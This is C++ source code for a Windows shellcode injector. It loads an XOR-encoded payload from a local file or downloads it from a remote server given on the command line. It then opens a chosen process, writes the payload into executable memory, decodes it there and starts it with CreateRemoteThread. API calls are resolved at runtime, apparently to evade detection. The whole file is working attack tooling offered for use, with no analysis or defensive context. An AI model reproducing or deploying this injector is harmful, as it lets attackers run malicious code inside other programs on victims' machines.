#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <WinError.h>
#include <Windows.h>
#include <winhttp.h>
#include "Structs.h"
#pragma comment(lib, "winhttp.lib")

using namespace std;

int main(int argc, char* argv[])
{
    if (argc < 2) {
        cout << "Usage: " << argv[0] << " [Remote|Local]\n";
        return 1;
    }

    string mode = argv[1]; // 1ยบ Arg: mode ("Local" or "Remote")

    if (mode == "Local" && argc != 5) {
        cout << "Usage: " << argv[0] << " Local <payload file> <Process PID> <XOR Encoding Key>\n";
        return 1;
    }
    else if (mode == "Remote" && argc != 6) {
        cout << "Usage: " << argv[0] << " Remote <Remote server IP> <File name> <Process ID> <XOR Encoding Key>\n";
        return 1;
    }

    // Variables to store the entered data
    string source; // 2nd Arg: local file or remote server IP
    DWORD process_id; // 4th or 5th Arg: PID of the process
    BYTE key; // 5th or 6th Arg: XOR key for encryption/decryption
    vector<BYTE> fileData;

    if (mode == "Local")
    {
        source = argv[2];
        process_id = atoi(argv[3]);
        key = static_cast<BYTE>(atoi(argv[4]));
        fileData = ReadBinaryFile(source);
    }
    else if (mode == "Remote")
    {
        string ip = argv[2];
        string remoteFile = argv[3];
        process_id = atoi(argv[4]);
        key = static_cast<BYTE>(atoi(argv[5]));

        // Format IP address and port in wide string format
        wstring Server = wstring(ip.begin(), ip.end());
        wstring filenameW = wstring(remoteFile.begin(), remoteFile.end());

        fileData = Download(Server.c_str(), filenameW.c_str());
    }

    // 1. Open the remote process
    OpenProcessPtr = (pOpenProcess)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "OpenProcess");

    HANDLE hRemoteProcess = OpenProcessPtr(PROCESS_ALL_ACCESS, FALSE, process_id);

    if (hRemoteProcess != NULL)
    {
        XOREncoding(fileData, key);

        // 2. Allocate a memory buffer in the remote process to store the shellcode
        VirtualAllocExPtr = (pVirtualAllocEx)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualAllocEx");

        LPVOID pRemoteBuffer = VirtualAllocExPtr(hRemoteProcess, &fileData[0], fileData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        // 3. Write the shellcode into the memory buffer
        SIZE_T WritteBytes;

        WriteProcessMemoryPtr = (pWriteProcessMemory)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "WriteProcessMemory");

        WriteProcessMemoryPtr(hRemoteProcess, pRemoteBuffer, &fileData[0], fileData.size(),  &WritteBytes);

        decodeXOR(hRemoteProcess, pRemoteBuffer, fileData.size(), key);

        //4. Execute the shellcode
        CreateRemoteThreadPtr = (pCreateRemoteThread)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateRemoteThread");

        HANDLE hThread = CreateRemoteThreadPtr(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);

        if (hThread != NULL) {
            WaitForSingleObjectPtr = (pWaitForSingleObject)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "WaitForSingleObject");
            WaitForSingleObjectPtr(hThread, 500);
            CloseHandle(hThread);
            VirtualFreePtr = (pVirtualFree)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualFree");
            VirtualFreePtr(pRemoteBuffer, fileData.size(), MEM_DECOMMIT);
            return 0;
        }
    }
    else
    {
        cout << "[-] Process with PID " << process_id << " doesn't exist or isn't running" << endl;
        return 1;
    }

	return 0;
}
